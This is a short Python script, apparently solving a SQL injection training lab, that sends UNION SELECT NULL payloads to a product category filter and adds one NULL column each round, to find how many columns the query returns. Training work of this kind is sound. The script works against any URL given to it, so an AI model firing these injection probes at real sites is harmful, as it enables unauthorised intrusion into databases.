#Lab: SQL injection UNION attack, determining the number of columns returned by the query

# This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
# To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

#variables globales
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxyjp = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
nombre_parametro = "Gifts"
ruta = f"filter?category={nombre_parametro}"

def Obtener_cantidad_columnas_función(url):
    columna = 0
    bandera = True
    while bandera:
        columna += 1 
        payload_obtener_cantidad_columnas = "' UNION SELECT " + ", ".join(["NULL"] * columna) + "--"
        print("Probando columna Nro: " + str(columna) + " -> Payload: " + str(payload_obtener_cantidad_columnas))
        solicitud = requests.get(url + ruta + payload_obtener_cantidad_columnas,verify=False, proxies=proxyjp) 
        respuesta = solicitud.text
        if "UNION SELECT" in respuesta: 
            bandera = False
            return columna
    return None

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        resultado = Obtener_cantidad_columnas_función(url)
        print("[+] Se identifico: " + str(resultado) + " columnas")
    except IndexError:
        print("[-] Uso: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s https://www.pagina.com" % sys.argv[0])
        sys.exit(-1)